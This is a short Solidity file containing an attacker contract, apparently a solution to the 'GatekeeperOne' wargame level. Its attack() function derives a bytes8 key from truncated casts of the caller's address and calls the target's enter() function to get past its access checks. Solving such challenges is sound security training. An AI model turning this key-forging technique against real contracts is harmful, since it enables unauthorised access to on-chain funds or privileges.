// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperOne.sol";

contract GatekeeperOneAttacker {

    address gatekeeperOne;

    constructor(address _gatekeeperOne) {
        require(_gatekeeperOne != address(0));
        gatekeeperOne = _gatekeeperOne;
    }

    function attack() external {
        bytes8 key = bytes8(uint64(uint16(uint160(msg.sender))) + 0x700000000);
        GatekeeperOne(gatekeeperOne).enter(key);
    }
}
